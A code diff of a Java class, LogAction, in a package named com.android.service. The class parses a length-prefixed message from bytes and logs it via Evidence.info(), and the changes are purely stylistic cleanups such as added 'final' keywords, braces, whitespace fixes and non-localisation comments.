@@ -22,9 +22,9 @@ import com.android.service.util.WChar;
  * The Class LogAction.
  */
 public class LogAction extends SubAction {
-	private static final String TAG = "LogAction";
+	private static final String TAG = "LogAction"; //$NON-NLS-1$
 	private String msg;
-	
+
 	/**
 	 * Instantiates a new log action.
 	 * 
@@ -45,24 +45,28 @@ public class LogAction extends SubAction {
 	@Override
 	public boolean execute() {
 		Evidence.info(msg);
-		
+
 		return true;
 	}
-	
+
 	@Override
 	protected boolean parse(final byte[] params) {
 		try {
-			DataBuffer db = new DataBuffer(params);
-		
+			final DataBuffer db = new DataBuffer(params);
+
 			// Message length
-			byte buffer[] = new byte[db.readInt()];
-			
+			final byte buffer[] = new byte[db.readInt()];
+
 			db.read(buffer);
-			
+
 			this.msg = WChar.getString(buffer, true);
-		} catch (IOException io) {
-			if(Cfg.DEBUG) Check.log(TAG + " Info: " + "parse() exception");
-			if(Cfg.DEBUG) { Check.log(io); }
+		} catch (final IOException io) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "parse() exception") ;//$NON-NLS-1$ //$NON-NLS-2$
+			}
+			if (Cfg.DEBUG) {
+				Check.log(io) ;//$NON-NLS-1$
+			}
 		}
 
 		return true;
